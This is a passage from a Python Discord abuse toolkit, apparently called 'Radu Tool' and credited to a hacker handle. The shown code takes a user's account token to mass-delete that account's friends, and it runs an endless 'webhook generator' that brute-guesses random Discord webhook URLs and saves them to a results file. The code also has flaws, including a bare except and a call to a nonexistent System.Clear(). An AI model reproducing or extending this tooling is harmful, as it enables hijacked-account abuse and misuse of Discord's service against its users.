            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool()
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        deleteFriends(token)
    if opc=="29":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Webhook Generator')
        print()
        webhook_api = 'https://discord.com/api/webhooks/'
        count = 0
        while True:
            try:
                numbers = ''.join(random.SystemRandom().choice(string.digits) for _ in range(19))
                code_webhook = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(85))
                webhook_genned = webhook_api + numbers + "/" + code_webhook
                count += 1
                print(f"{purple}[{green}+{purple}]{reset} Generated Webhook | {blue}{webhook_genned}{reset} | [{count}]")
                folder = "Results"
                file = f"Webhooks_Generated.txt"
                if not os.path.exists(folder):
                    os.makedirs(folder)
                with open(os.path.join(folder, file), "a+", encoding="utf-8") as f:
                    f.write(webhook_genned + "\n")
            except:
                print(f"{purple}[{red}-{purple}]{reset} Error Generating Webhook!")
    if opc==">":
        radutool2()
    else:
        System.Clear()
        radutool()
radutool()